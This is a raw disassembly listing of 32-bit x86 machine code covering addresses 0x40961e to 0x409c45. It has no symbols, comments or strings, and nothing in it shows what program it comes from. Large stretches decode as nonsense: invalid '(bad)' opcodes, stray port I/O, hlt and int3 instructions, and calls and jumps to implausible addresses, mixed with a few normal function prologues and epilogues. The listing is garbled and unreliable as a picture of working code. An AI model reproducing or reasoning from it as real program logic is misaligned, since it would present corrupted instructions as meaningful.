  40961e:	85 c9                	test   %ecx,%ecx
  409620:	74 3c                	je     0x40965e
  409622:	57                   	push   %edi
  409623:	83 c0 76             	add    $0x76,%eax
  409626:	6a 00                	push   $0x0
  409628:	50                   	push   %eax
  409629:	e8 b2 6a 00 00       	call   0x4100e0
  40962e:	ed                   	in     (%dx),%eax
  40962f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  409630:	89 92 0c 74 29 8b    	mov    %edx,-0x74d68bf4(%edx)
  409636:	06                   	push   %es
  409637:	50                   	push   %eax
  409638:	90                   	nop
  409639:	3c fd                	cmp    $0xfd,%al
  40963b:	0f ff a2 c4 04 85 06 	ud0    0x68504c4(%edx),%esp
  409642:	75 0e                	jne    0x409652
  409644:	8b 0e                	mov    (%esi),%ecx
  409646:	68 aa 93 6b 00       	push   $0x6b93aa
  40964b:	51                   	push   %ecx
  40964c:	bb e8 ee bf ff       	mov    $0xffbfeee8,%ebx
  409651:	ff 8b 45 0c 5f 5e    	decl   0x5e5f0c45(%ebx)
  409657:	29 8b e5 5d c2 0e    	sub    %ecx,0xec25de5(%ebx)
  40965d:	8b 83 3d dc 08 4d    	mov    0x4d08dc3d(%ebx),%eax
  409663:	00 58 7c             	add    %bl,0x7c(%eax)
  409666:	d5 8b                	aad    $0x8b
  409668:	06                   	push   %es
  409669:	db af 18 84 e4 79    	fldt   0x79e48418(%edi)
  40966f:	0d 50 e8 4a 00       	or     $0x4ae850,%eax
  409674:	00 00                	add    %al,(%eax)
  409676:	83 c4 04             	add    $0x4,%esp
  409679:	85 c0                	test   %eax,%eax
  40967b:	74 0b                	je     0x409688
  40967d:	8b 06                	mov    (%esi),%eax
  40967f:	8b 48 18             	mov    0x18(%eax),%ecx
  409682:	64 e5 7f             	fs in  $0x7f,%eax
  409685:	b3 48                	mov    $0x48,%bl
  409687:	6d                   	insl   (%dx),%es:(%edi)
  409688:	8b 37                	mov    (%edi),%esi
  40968a:	6a 00                	push   $0x0
  40968c:	57                   	push   %edi
  40968d:	83 c2 5c             	add    $0x5c,%edx
  409690:	6a 01                	push   $0x1
  409692:	52                   	push   %edx
  409693:	e8 78 c9 ff ff       	call   0x406010
  409698:	74 c7                	je     0x409661
  40969a:	a0 75 15 7f 36       	mov    0x367f1575,%al
  40969f:	16                   	push   %ss
  4096a0:	20 57 40             	and    %dl,0x40(%edi)
  4096a3:	00 68 40             	add    %ch,0x40(%eax)
  4096a6:	26 40                	es inc %eax
  4096a8:	00 56 8b             	add    %dl,-0x75(%esi)
  4096ab:	06                   	push   %es
  4096ac:	50                   	push   %eax
  4096ad:	e8 4e bf ff ff       	call   0x405600
  4096b2:	33 fc                	xor    %esp,%edi
  4096b4:	2e ac                	lods   %cs:(%esi),%al
  4096b6:	5b                   	pop    %ebx
  4096b7:	8b e5                	mov    %ebp,%esp
  4096b9:	5d                   	pop    %ebp
  4096ba:	73 9e                	jae    0x40965a
  4096bc:	0b 90 77 90 55 8b    	or     -0x74aa6f89(%eax),%edx
  4096c2:	ec                   	in     (%dx),%al
  4096c3:	83 50 38 56          	adcl   $0x56,0x38(%eax)
  4096c7:	8b ef                	mov    %edi,%ebp
  4096c9:	08 8d 45 c8 c7 45    	or     %cl,0x45c7c845(%ebp)
  4096cf:	fc                   	cld
  4096d0:	6c                   	insb   (%dx),%es:(%edi)
  4096d1:	00 b1 00 8b 4e 04    	add    %dh,0x44e8b00(%ecx)
  4096d7:	50                   	push   %eax
  4096d8:	b9 ff 15 1d c0       	mov    $0xc01d15ff,%ecx
  4096dd:	7c 00                	jl     0x4096df
  4096df:	85 c0                	test   %eax,%eax
  4096e1:	74 0f                	je     0x4096f2
  4096e3:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4096e6:	f6 3b                	idivb  (%ebx)
  4096e8:	02 74 07 33          	add    0x33(%edi,%eax,1),%dh
  4096ec:	c0 26 8b             	shlb   $0x8b,(%esi)
  4096ef:	e5 5d                	in     $0x5d,%eax
  4096f1:	c3                   	ret
  4096f2:	8b 46 0c             	mov    0xc(%esi),%eax
  4096f5:	85 c0                	test   %eax,%eax
  4096f7:	74 11                	je     0x40970a
  4096f9:	c7 40 08 00 62 ff 00 	movl   $0xff6200,0x8(%eax)
  409700:	8b 56 0c             	mov    0xc(%esi),%edx
  409703:	c7                   	(bad)
  409704:	6d                   	insl   (%dx),%es:(%edi)
  409705:	0c 00                	or     $0x0,%al
  409707:	00 00                	add    %al,(%eax)
  409709:	29 8b 46 d6 8b 56    	sub    %ecx,0x568bd646(%ebx)
  40970f:	04 57                	add    $0x57,%al
  409711:	27                   	daa
  409712:	4d                   	dec    %ebp
  409713:	fc                   	cld
  409714:	6c                   	insb   (%dx),%es:(%edi)
  409715:	40                   	inc    %eax
  409716:	18 00                	sbb    %al,(%eax)
  409718:	6a c6                	push   $0xffffffc6
  40971a:	6a 3a                	push   $0x3a
  40971c:	6a 00                	push   $0x0
  40971e:	68 c4 00 09 00       	push   $0x900c4
  409723:	52                   	push   %edx
  409724:	ff 15 b8 c0 c9 00    	call   *0xc9c0b8
  40972a:	85 c0                	test   %eax,%eax
  40972c:	74 08                	je     0x409736
  40972e:	5f                   	pop    %edi
  40972f:	33 6c 5e e2          	xor    -0x1e(%esi,%ebx,2),%ebp
  409733:	e5 5d                	in     $0x5d,%eax
  409735:	c3                   	ret
  409736:	8b 3d 98 c0 40 00    	mov    0x40c098,%edi
  40973c:	ff 75 2d             	push   0x2d(%ebp)
  40973f:	c0 a9 06 5f 5e 8b e5 	shrb   $0xe5,-0x74a1a0fa(%ecx)
  409746:	ac                   	lods   %ds:(%esi),%al
  409747:	c3                   	ret
  409748:	ff b0 05 80 fc 0a    	push   0xafc8005(%eax)
  40974e:	00 3d 9f 00 0b 00    	add    %bh,0xb009f
  409754:	0f 4e b2 00 4e 00 5b 	cmovle 0x5b004e00(%edx),%esi
  40975b:	3d 9c c0 40 00       	cmp    $0x40c09c,%eax
  409760:	8b 4e 14             	mov    0x14(%esi),%ecx
  409763:	8b 46 35             	mov    0x35(%esi),%eax
  409766:	85 9b 7c de 7f 04    	test   %ebx,0x47fde7c(%ebx)
  40976c:	ea c0 ba 10 6a 00 04 	ljmp   $0x400,$0x6a10bac0
  409773:	b4 03                	mov    $0x3,%ah
  409775:	43                   	inc    %ebx
  409776:	00 51 50             	add    %dl,0x50(%ecx)
  409779:	09 4d 1e             	or     %ecx,0x1e(%ebp)
  40977c:	00 00                	add    %al,(%eax)
  40977e:	eb 0d                	jmp    0x40978d
  409780:	23 c1                	and    %ecx,%eax
  409782:	83 f8 5e             	cmp    $0x5e,%eax
  409785:	75 07                	jne    0x40978e
  409787:	0b c0                	or     %eax,%eax
  409789:	e9 4a 33 c0 50       	jmp    0x5100cad8
  40978e:	8b 46 0c             	mov    0xc(%esi),%eax
  409791:	8b 48 10             	mov    0x10(%eax),%ecx
  409794:	51                   	push   %ecx
  409795:	ff d7                	call   *%edi
  409797:	3d 80 54 00 f0       	cmp    $0xf0005480,%eax
  40979c:	74 c2                	je     0x409760
  40979e:	69 c0 74 31 ba ec    	imul   $0xecba3174,%eax,%eax
  4097a4:	05 41 04 8b 7e       	add    $0x7e8b0441,%eax
  4097a9:	04 85                	add    $0x85,%al
  4097ab:	c0 a2 18 50 68 ec a1 	shlb   $0xa1,-0x1397afe8(%edx)
  4097b2:	41                   	inc    %ecx
  4097b3:	00 97 e8 86 11 00    	add    %dl,0x1186e8(%edi)
  4097b9:	00 b1 c4 0c a3 ec    	add    %dh,-0x135cf33c(%ecx)
  4097bf:	05 41 00 85 c0       	add    $0xc0850041,%eax
  4097c4:	74 05                	je     0x4097cb
  4097c6:	57                   	push   %edi
  4097c7:	ff d0                	call   *%eax
  4097c9:	eb 08                	jmp    0x4097d3
  4097cb:	c3                   	ret
  4097cc:	b3 ff                	mov    $0xff,%bl
  4097ce:	0a 4c c5 40          	or     0x40(%ebp,%eax,8),%cl
  4097d2:	00 8b 46 0c 2c 73    	add    %cl,0x732c0c46(%ebx)
  4097d8:	04 8d                	add    $0x8d,%al
  4097da:	55                   	push   %ebp
  4097db:	fc                   	cld
  4097dc:	6a 01                	push   $0x1
  4097de:	bd 50 51 ff 40       	mov    $0x40ff5150,%ebp
  4097e3:	b4 07                	mov    $0x7,%ah
  4097e5:	b0 00                	mov    $0x0,%al
  4097e7:	6a 0b                	push   $0xb
  4097e9:	74 08                	je     0x4097f3
  4097eb:	5f                   	pop    %edi
  4097ec:	33 c0                	xor    %eax,%eax
  4097ee:	5e                   	pop    %esi
  4097ef:	8b e5                	mov    %ebp,%esp
  4097f1:	5d                   	pop    %ebp
  4097f2:	c3                   	ret
  4097f3:	8b 35 98 de 40 00    	mov    0x40de98,%esi
  4097f9:	44                   	inc    %esp
  4097fa:	1d dd c0 75 06       	sbb    $0x675c0dd,%eax
  4097ff:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  409800:	5e                   	pop    %esi
  409801:	8b 8f 5d c3 ff d6    	mov    -0x29003ca3(%edi),%ecx
  409807:	ec                   	in     (%dx),%al
  409808:	80 fc 0a             	cmp    $0xa,%ah
  40980b:	00 5f 5e             	add    %bl,0x5e(%edi)
  40980e:	6c                   	insb   (%dx),%es:(%edi)
  40980f:	e5 5d                	in     $0x5d,%eax
  409811:	c3                   	ret
  409812:	90                   	nop
  409813:	90                   	nop
  409814:	90                   	nop
  409815:	0b 90 90 90 90 20    	or     0x20909090(%eax),%edx
  40981b:	de 90 90 90 90 55    	ficoms 0x55909090(%eax)
  409821:	8b 6d 56             	mov    0x56(%ebp),%ebp
  409824:	8b 75 08             	mov    0x8(%ebp),%esi
  409827:	56                   	push   %esi
  409828:	e8 13 fb ff cb       	call   0xcc409340
  40982d:	83 c4 87             	add    $0xffffff87,%esp
  409830:	85 c5                	test   %eax,%ebp
  409832:	1a 1d 8b eb 68 40    	sbb    0x4068eb8b,%bl
  409838:	93                   	xchg   %eax,%ebx
  409839:	40                   	inc    %eax
  40983a:	00 56 50             	add    %dl,0x50(%esi)
  40983d:	e8 d4 bc ff 8d       	call   0x8e405516
  409842:	8b 76 17             	mov    0x17(%esi),%esi
  409845:	85 f6                	test   %esi,%esi
  409847:	74 26                	je     0x40986f
  409849:	56                   	push   %esi
  40984a:	e8 51 90 de 00       	call   0x11f28a0
  40984f:	33 c0                	xor    %eax,%eax
  409851:	3f                   	aas
  409852:	5d                   	pop    %ebp
  409853:	c2 04 00             	ret    $0x4
  409856:	a2 90 90 90 8b       	mov    %al,0x8b909090
  40985b:	90                   	nop
  40985c:	90                   	nop
  40985d:	90                   	nop
  40985e:	90                   	nop
  40985f:	e1 f7                	loope  0x409858
  409861:	11 ec                	adc    %ebp,%esp
  409863:	53                   	push   %ebx
  409864:	56                   	push   %esi
  409865:	8b 75 10             	mov    0x10(%ebp),%esi
  409868:	ec                   	in     (%dx),%al
  409869:	8b 57 0c             	mov    0xc(%edi),%edx
  40986c:	33 db                	xor    %ebx,%ebx
  40986e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409871:	8d 45 10             	lea    0x10(%ebp),%eax
  409874:	50                   	push   %eax
  409875:	75 51                	jne    0x4098c8
  409877:	7f 75                	jg     0x4098ee
  409879:	10 21                	adc    %ah,(%ecx)
  40987b:	d1 15 00 00 8b 69    	rcll   $1,0x698b0000
  409881:	10 86 f9 2b f1 03    	adc    %al,0x3f12bf9(%esi)
  409887:	d9 85 0a 75 04 85    	flds   -0x7afb8af6(%ebp)
  40988d:	f6 77 eb             	divb   -0x15(%edi)
  409890:	8b 4d 14             	mov    0x14(%ebp),%ecx
  409893:	85 c9                	test   %ecx,%ecx
  409895:	74 02                	je     0x409899
  409897:	fe                   	(bad)
  409898:	19 5f 5e             	sbb    %ebx,0x5e(%edi)
  40989b:	5b                   	pop    %ebx
  40989c:	5d                   	pop    %ebp
  40989d:	c2 10 00             	ret    $0x10
  4098a0:	55                   	push   %ebp
  4098a1:	92                   	xchg   %eax,%edx
  4098a2:	ec                   	in     (%dx),%al
  4098a3:	6b ec e1             	imul   $0xffffffe1,%esp,%ebp
  4098a6:	53                   	push   %ebx
  4098a7:	98                   	cwtl
  4098a8:	e3 41                	jecxz  0x4098eb
  4098aa:	86 53 33             	xchg   %dl,0x33(%ebx)
  4098ad:	cb                   	lret
  4098ae:	56                   	push   %esi
  4098af:	83 d3 1e             	adc    $0x1e,%ebx
  4098b2:	1a 89 55 f8 89 55    	sbb    0x5589f855(%ecx),%cl
  4098b8:	f4                   	hlt
  4098b9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4098bc:	8b 17                	mov    (%edi),%edx
  4098be:	8b 45 10             	mov    0x10(%ebp),%eax
  4098c1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4098c4:	50                   	push   %eax
  4098c5:	51                   	push   %ecx
  4098c6:	e8 05 06 00 b2       	call   0xb2409ed0
  4098cb:	83 c4 80             	add    $0xffffff80,%esp
  4098ce:	5f                   	pop    %edi
  4098cf:	5e                   	pop    %esi
  4098d0:	5b                   	pop    %ebx
  4098d1:	da e5                	(bad)
  4098d3:	5d                   	pop    %ebp
  4098d4:	c3                   	ret
  4098d5:	8b 4d a7             	mov    -0x59(%ebp),%ecx
  4098d8:	f7 6b 6e             	imull  0x6e(%ebx)
  4098db:	94                   	xchg   %eax,%esp
  4098dc:	73 00                	jae    0x4098de
  4098de:	70 84                	jo     0x409864
  4098e0:	2c 02                	sub    $0x2,%al
  4098e2:	00 72 87             	add    %dh,-0x79(%edx)
  4098e5:	f1                   	int1
  4098e6:	54                   	push   %esp
  4098e7:	db ae 75 d3 00 11    	fldt   0x1100d375(%esi)
  4098ed:	00 89 5d fc 89 55    	add    %cl,0x5589fc5d(%ecx)
  4098f3:	ec                   	in     (%dx),%al
  4098f4:	74 0a                	je     0x409900
  4098f6:	dc 97 fc 01 f2 00    	fcoml  0xf201fc(%edi)
  4098fc:	00 8b 5d dc 8b f9    	add    %cl,-0x67423a3(%ebx)
  409902:	81 65 00 00 22 00 d5 	andl   $0xd5002200,0x0(%ebp)
  409909:	06                   	push   %es
  40990a:	d8 cb                	fmul   %st(3),%st
  40990c:	02 89 5d fc 6b e1    	add    -0x1e9403a3(%ecx),%cl
  409912:	00 66 70             	add    %ah,0x70(%esi)
  409915:	00 89 de 1e bb ad    	add    %cl,-0x5244e122(%ecx)
  40991b:	26 77 04             	es ja  0x409922
  40991e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  409921:	8b 45 14             	mov    0x14(%ebp),%eax
  409924:	83 c8 02             	or     $0x2,%eax
  409927:	0f 85 e1 00 00 00    	jne    0x409a0e
  40992d:	8b 55 0c             	mov    0xc(%ebp),%edx
  409930:	6a a2                	push   $0xffffffa2
  409932:	68 e0 00 41 00       	push   $0x4100e0
  409937:	52                   	push   %edx
  409938:	33 db                	xor    %ebx,%ebx
  40993a:	ff 59 04             	lcall  *0x4(%ecx)
  40993d:	c1 9a 00 83 c4 0c 85 	rcrl   $0x85,0xcc48300(%edx)
  409944:	1c 75                	sbb    $0x75,%al
  409946:	89 8b 45 0c bb 04    	mov    %ecx,0x4bb0c45(%ebx)
  40994c:	00 00                	add    %al,(%eax)
  40994e:	00 53 83             	add    %dl,-0x7d(%ebx)
  409951:	c0 0c 68 80          	rorb   $0x80,(%eax,%ebp,2)
  409955:	01 41 00             	add    %eax,0x0(%ecx)
  409958:	50                   	push   %eax
  409959:	ff 15 c2 ae 40 55    	call   *0x5540aec2
  40995f:	83 c4 0c             	add    $0xc,%esp
  409962:	85 c0                	test   %eax,%eax
  409964:	d9 0e                	(bad) (%esi)
  409966:	b8 5b 0c bb 06       	mov    $0x6bb0c5b,%eax
  40996b:	00 00                	add    %al,(%eax)
  40996d:	30 90 c7 41 0c 5c    	xor    %dl,0x5c0c41c7(%eax)
  409973:	01 5f 4c             	add    %ebx,0x4c(%edi)
  409976:	06                   	push   %es
  409977:	41                   	inc    %ecx
  409978:	d2 85 c0 75 19 5d    	rolb   %cl,0x5d1975c0(%ebp)
  40997e:	55                   	push   %ebp
  40997f:	68 8b 97 1c 6a       	push   $0x6a1c978b
  409984:	fc                   	cld
  409985:	e8 b6 0f fa 00       	call   0x13aa940
  40998a:	cc                   	int3
  40998b:	c4 0c a3             	les    (%ebx,%eiz,4),%ecx
  40998e:	4c                   	dec    %esp
  40998f:	06                   	push   %es
  409990:	ae                   	scas   %es:(%edi),%al
  409991:	00 85 c0 74 ea ab    	add    %al,-0x54158b40(%ebp)
  409997:	4d                   	dec    %ebp
  409998:	e8 8d 55 ec f7       	call   0xf82cef2a
  40999d:	d9 dd                	(bad)
  40999f:	1f                   	pop    %ds
  4099a0:	55                   	push   %ebp
  4099a1:	f0 25 c9 6a 00 23    	lock and $0x23006ac9,%eax
  4099a7:	ca 2b 0b             	lret   $0xb2b
  4099aa:	f8                   	clc
  4099ab:	44                   	inc    %esp
  4099ac:	df 51 8d             	fists  -0x73(%ecx)
  4099af:	4d                   	dec    %ebp
  4099b0:	f4                   	hlt
  4099b1:	1b ff                	sbb    %edi,%edi
  4099b3:	1b f9                	sbb    %ecx,%edi
  4099b5:	d8 4d fc             	fmuls  -0x4(%ebp)
  4099b8:	f7 0f 1d f6 57 24    	testl  $0x2457f61d,(%edi)
  4099be:	82 8b 55 0c b9 51 8d 	orb    $0x8d,0x51b90c55(%ebx)
  4099c5:	0c 5a                	or     $0x5a,%al
  4099c7:	6a 01                	push   $0x1
  4099c9:	57                   	push   %edi
  4099ca:	b6 d0                	mov    $0xd0,%dh
  4099cc:	41                   	inc    %ecx
  4099cd:	0a 6a 01             	or     0x1(%edx),%ch
  4099d0:	ff 15 4c c0 40 00    	call   *0x40c04c
  4099d6:	33 c0                	xor    %eax,%eax
  4099d8:	83 fb 06             	cmp    $0x6,%ebx
  4099db:	55                   	push   %ebp
  4099dc:	ac                   	lods   %ds:(%esi),%al
  4099dd:	8b 55 0c             	mov    0xc(%ebp),%edx
  4099e0:	00 22                	add    %ah,(%edx)
  4099e2:	42                   	inc    %edx
  4099e3:	0c 43                	or     $0x43,%al
  4099e5:	00 50 fd             	add    %dl,-0x3(%eax)
  4099e8:	3b 7e f8             	cmp    -0x8(%esi),%edi
  4099eb:	85 b1 a5 00 00 8b    	test   %esi,-0x74ffff5b(%ecx)
  4099f1:	5b                   	pop    %ebx
  4099f2:	08 8b 55 ec 68 20    	or     %cl,0x2068ec55(%ebx)
  4099f8:	57                   	push   %edi
  4099f9:	40                   	inc    %eax
  4099fa:	00 68 60             	add    %ch,0x60(%eax)
  4099fd:	1b 40 00             	sbb    0x0(%eax),%eax
  409a00:	e5 07                	in     $0x7,%eax
  409a02:	52                   	push   %edx
  409a03:	61                   	popa
  409a04:	e8 f7 bb ff ff       	call   0x405600
  409a09:	e9 c8 00 00 00       	jmp    0x409ad6
  409a0e:	17                   	pop    %ss
  409a0f:	f8                   	clc
  409a10:	49                   	dec    %ecx
  409a11:	da 57 d9             	ficoml -0x27(%edi)
  409a14:	50                   	push   %eax
  409a15:	06                   	push   %es
  409a16:	41                   	inc    %ecx
  409a17:	00 3b                	add    %bh,(%ebx)
  409a19:	c2 75 1c             	ret    $0x1c75
  409a1c:	52                   	push   %edx
  409a1d:	68 50 01 41 00       	push   $0x410150
  409a22:	6a 01                	push   $0x1
  409a24:	bc 17 0f 00 00       	mov    $0xf17,%esp
  409a29:	16                   	push   %ss
  409a2a:	c4 0c a3             	les    (%ebx,%eiz,4),%ecx
  409a2d:	72 27                	jb     0x409a56
  409a2f:	41                   	inc    %ecx
  409a30:	00 60 f1             	add    %ah,-0xf(%eax)
  409a33:	74 5f                	je     0x409a94
  409a35:	8b f2                	mov    %edx,%esi
  409a37:	e8 59 55 ec f7       	call   0xf82cef95
  409a3c:	d9 52 8d             	fsts   -0x73(%edx)
  409a3f:	55                   	push   %ebp
  409a40:	f0 1b c9             	lock sbb %ecx,%ecx
  409a43:	6a 00                	push   $0x0
  409a45:	23 ca                	and    %edx,%ecx
  409a47:	8d 6c f8 05          	lea    0x5(%eax,%edi,8),%ebp
  409a4b:	df 51 8d             	fists  -0x73(%ecx)
  409a4e:	4d                   	dec    %ebp
  409a4f:	33 63 ff             	xor    -0x1(%ebx),%esp
  409a52:	23 b9 8b 4d 0c 4d    	and    0x4d0c4d8b(%ecx),%edi
  409a58:	de a3 f6 57 b7 f2    	fisubs -0xd48a80a(%ebx)
  409a5e:	f4                   	hlt
  409a5f:	53                   	push   %ebx
  409a60:	6a 01                	push   $0x1
  409a62:	51                   	push   %ecx
  409a63:	ff d0                	call   *%eax
  409a65:	e9 7c ff ff ff       	jmp    0x4099e6
  409a6a:	3b c2                	cmp    %edx,%eax
  409a6c:	5c                   	pop    %esp
  409a6d:	db 92 00 00 00 a1    	fistl  -0x5f000000(%edx)
  409a73:	54                   	push   %esp
  409a74:	06                   	push   %es
  409a75:	41                   	inc    %ecx
  409a76:	00 3b                	add    %bh,(%ebx)
  409a78:	c2 75 bd             	ret    $0xbd75
  409a7b:	52                   	push   %edx
  409a7c:	68 40 01 41 00       	push   $0x410140
  409a81:	ed                   	in     (%dx),%eax
  409a82:	01 5c b8 96          	add    %ebx,-0x6a(%eax,%edi,4)
  409a86:	00 00                	add    %al,(%eax)
  409a88:	83 65 0c a3          	andl   $0xffffffa3,0xc(%ebp)
  409a8c:	54                   	push   %esp
  409a8d:	83 41 00 85          	addl   $0xffffff85,0x0(%ecx)
  409a91:	94                   	xchg   %eax,%esp
  409a92:	e7 a1                	out    %eax,$0xa1
  409a94:	6a 01                	push   $0x1
  409a96:	ff 15 4c c0 40 00    	call   *0x40c04c
  409a9c:	41                   	inc    %ecx
  409a9d:	4f                   	dec    %edi
  409a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  409a9f:	5b                   	pop    %ebx
  409aa0:	ff 8b 7d 08 d7 4d    	decl   0x4dd7087d(%ebx)
  409aa6:	f0 89 4d f4          	lock mov %ecx,-0xc(%ebp)
  409aaa:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  409aad:	39 4d ac             	cmp    %ecx,-0x54(%ebp)
  409ab0:	68 77 96 55 10       	push   $0x10559677
  409ab5:	52                   	push   %edx
  409ab6:	57                   	push   %edi
  409ab7:	e8 14 04 00 00       	call   0x409ed0
  409abc:	83 c4 08             	add    $0x8,%esp
  409abf:	eb 8a                	jmp    0x409a4b
  409ac1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409ac4:	07                   	pop    %es
  409ac5:	c9                   	leave
  409ac6:	3b c1                	cmp    %ecx,%eax
  409ac8:	74 0e                	je     0x409ad8
  409aca:	89 47 10             	mov    %eax,0x10(%edi)
  409acd:	8b 47 04             	mov    0x4(%edi),%eax
  409ad0:	65 00 00             	add    %al,%gs:(%eax)
  409ad3:	6d                   	insl   (%dx),%es:(%edi)
  409ad4:	00 89 73 c7 5b 45    	add    %cl,0x455bc773(%ecx)
  409ada:	f4                   	hlt
  409adb:	3b c1                	cmp    %ecx,%eax
  409add:	80 0e 85             	orb    $0x85,(%esi)
  409ae0:	88 14 02             	mov    %dl,(%edx,%eax,1)
  409ae3:	47                   	inc    %edi
  409ae4:	04 e0                	add    $0xe0,%al
  409ae6:	00 00                	add    %al,(%eax)
  409ae8:	02 00                	add    (%eax),%al
  409aea:	a3 47 04 8b 49       	mov    %eax,0x498b0447
  409aef:	f0 3b c1             	lock cmp %ecx,%eax
  409af2:	74 f0                	je     0x409ae4
  409af4:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409af7:	50                   	push   %eax
  409af8:	51                   	push   %ecx
  409af9:	a2 e8 81 01 00       	mov    %al,0x181e8
  409afe:	00 83 c4 9a 8d 0f    	add    %al,0xf8d9ac4(%ebx)
  409b04:	5f                   	pop    %edi
  409b05:	9e                   	sahf
  409b06:	87 4c 11 01          	xchg   %ecx,0x1(%ecx,%edx,1)
  409b0a:	00 5b 8b             	add    %bl,-0x75(%ebx)
  409b0d:	e5 39                	in     $0x39,%eax
  409b0f:	6a 8b                	push   $0xffffff8b
  409b11:	db 08                	fisttpl (%eax)
  409b13:	1a 3d 74 08 7c 43    	sbb    0x437c0874,%bh
  409b19:	32 d3                	xor    %bl,%dl
  409b1b:	8c 1b                	mov    %ds,(%ebx)
  409b1d:	01 00                	add    %eax,(%eax)
  409b1f:	00 8b 45 10 b3 00    	add    %cl,0xb31045(%ebx)
  409b25:	02 00                	add    (%eax),%al
  409b27:	00 85 c8 cc 84 0b    	add    %al,0xb84ccc8(%ebp)
  409b2d:	01 00                	add    %eax,(%eax)
  409b2f:	00 ca                	add    %cl,%dl
  409b31:	7f 0c                	jg     0x409b3f
  409b33:	01 d9                	add    %ebx,%ecx
  409b35:	6a 01                	push   $0x1
  409b37:	01 00                	add    %eax,(%eax)
  409b39:	00 8b 4d 14 85 b1    	add    %cl,-0x4e7aebb3(%ebx)
  409b3f:	75 67                	jne    0x409ba8
  409b41:	42                   	inc    %edx
  409b42:	74 06                	je     0x409b4a
  409b44:	41                   	inc    %ecx
  409b45:	00 85 c0 17 19 50    	add    %al,0x501917c0(%ebp)
  409b4b:	68 28 01 41 00       	push   $0x410128
  409b50:	6a 05                	push   $0x5
  409b52:	e8 e9 cd 00 03       	call   0x3416940
  409b57:	83 c4 0c             	add    $0xc,%esp
  409b5a:	a3 74 06 41 00       	mov    %eax,0x410674
  409b5f:	37                   	aaa
  409b60:	c0 0e 3b             	rorb   $0x3b,(%esi)
  409b63:	b2 bb                	mov    $0xbb,%dl
  409b65:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  409b68:	6a 20                	push   $0x20
  409b6a:	51                   	push   %ecx
  409b6b:	20 4d 0c             	and    %cl,0xc(%ebp)
  409b6e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409b71:	52                   	push   %edx
  409b72:	61                   	popa
  409b73:	ff d0                	call   *%eax
  409b75:	58                   	pop    %eax
  409b76:	2a 20                	sub    (%eax),%ah
  409b78:	85 be 00 00 00 8b    	test   %edi,-0x75000000(%esi)
  409b7e:	45                   	inc    %ebp
  409b7f:	e4 85                	in     $0x85,%al
  409b81:	c0 0f 85             	rorb   $0x85,(%edi)
  409b84:	b3 00                	mov    $0x0,%bl
  409b86:	00 00                	add    %al,(%eax)
  409b88:	33 45 c8             	xor    -0x38(%ebp),%eax
  409b8b:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  409b8e:	89 47 34             	mov    %eax,0x34(%edi)
  409b91:	8b fb                	mov    %ebx,%edi
  409b93:	04 89                	add    $0x89,%al
  409b95:	57                   	push   %edi
  409b96:	30 eb                	xor    %ch,%bl
  409b98:	f2 e9 9a 00 00 00    	bnd jmp 0x409c38
  409b9e:	6a 01                	push   $0x1
  409ba0:	de 15 4c ac 40 00    	ficoms 0x40ac4c
  409ba6:	eb 39                	jmp    0x409be1
  409ba8:	8b 1d 4c c0 40 00    	mov    0x40c04c,%ebx
  409bae:	6a 00                	push   $0x0
  409bb0:	ff d3                	call   *%ebx
  409bb2:	58                   	pop    %eax
  409bb3:	fe 02                	incb   (%edx)
  409bb5:	75 1c                	jne    0x409bd3
  409bb7:	a1 60 06 41 00       	mov    0x410660,%eax
  409bbc:	85 c0                	test   %eax,%eax
  409bbe:	75 18                	jne    0x409bd8
  409bc0:	e8 68 10 01 41       	call   0x4141ac2d
  409bc5:	8f                   	(bad)
  409bc6:	50                   	push   %eax
  409bc7:	e8 74 0d 00 00       	call   0x40a940
  409bcc:	a3 cd 06 49 94       	mov    %eax,0x944906cd
  409bd1:	eb 1f                	jmp    0x409bf2
  409bd3:	83 fe 01             	cmp    $0x1,%esi
  409bd6:	75 37                	jne    0x409c0f
  409bd8:	a1 97 06 41 fa       	mov    0xfa410697,%eax
  409bdd:	18 c0                	sbb    %al,%al
  409bdf:	75 18                	jne    0x409bf9
  409be1:	50                   	push   %eax
  409be2:	68 14 00 41 00       	push   $0x410014
  409be7:	50                   	push   %eax
  409be8:	e8 f3 0d 00 7c       	call   0x7c40a9e0
  409bed:	a3 5c 06 4b 00       	mov    %eax,0x4b065c
  409bf2:	83 c4 c0             	add    $0xffffffc0,%esp
  409bf5:	85 c0                	test   %eax,%eax
  409bf7:	e9 71 8b 55 0c       	jmp    0xc96276d
  409bfc:	8d 4d 08             	lea    0x8(%ebp),%ecx
  409bff:	51                   	push   %ecx
  409c00:	52                   	push   %edx
  409c01:	ff d0                	call   *%eax
  409c03:	39 f0                	cmp    %esi,%eax
  409c05:	eb 16                	jmp    0x409c1d
  409c07:	8f 02                	pop    (%edx)
  409c09:	ff                   	(bad)
  409c0a:	bc 33 bd eb 12       	mov    $0x12ebbd33,%esp
  409c0f:	c5 75 0c             	lds    0xc(%ebp),%esi
  409c12:	83 fe ff             	cmp    $0xffffffff,%esi
  409c15:	75 0a                	jne    0x409c21
  409c17:	ff 15 b0 c0 d8 00    	call   *0xd8c0b0
  409c1d:	c6                   	(bad)
  409c1e:	11 75 1a             	adc    %esi,0x1a(%ebp)
  409c21:	20 4d 08             	and    %cl,0x8(%ebp)
  409c24:	33 c0                	xor    %eax,%eax
  409c26:	0b c6                	or     %esi,%eax
  409c28:	33 d2                	xor    %edx,%edx
  409c2a:	c3                   	ret
  409c2b:	47                   	inc    %edi
  409c2c:	ac                   	lods   %ds:(%esi),%al
  409c2d:	8b 8d 04 58 ca 80    	mov    -0x7f35a7fc(%ebp),%ecx
  409c33:	cc                   	int3
  409c34:	02 89 4f 34 89 47    	add    0x4789344f(%ecx),%cl
  409c3a:	9c                   	pushf
  409c3b:	5d                   	pop    %ebp
  409c3c:	36 04 8b             	ss add $0x8b,%al
  409c3f:	75 10                	jne    0x409c51
  409c41:	f7 d0                	not    %eax
  409c43:	03 c6                	add    %esi,%eax
  409c45:	5f                   	pop    %edi
